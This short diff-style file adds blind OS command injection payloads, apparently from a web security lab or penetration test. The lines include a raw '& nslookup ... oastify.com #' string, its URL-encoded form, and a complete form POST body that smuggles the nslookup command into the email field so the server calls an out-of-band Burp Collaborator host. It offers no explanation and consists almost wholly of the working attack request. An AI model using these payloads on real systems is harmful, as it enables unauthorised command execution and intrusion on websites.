@@ -1,0 +1,5 @@
+
+ & nslookup 4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com #
+ +%26+nslookup+4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com+%2
+
+csrf=anPXUgCFtsbweoNyaKhD4wIodKcZcXKJ&name=test&email=test%40test.com+%26+nslookup+4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com+%23&subject=test&message=test
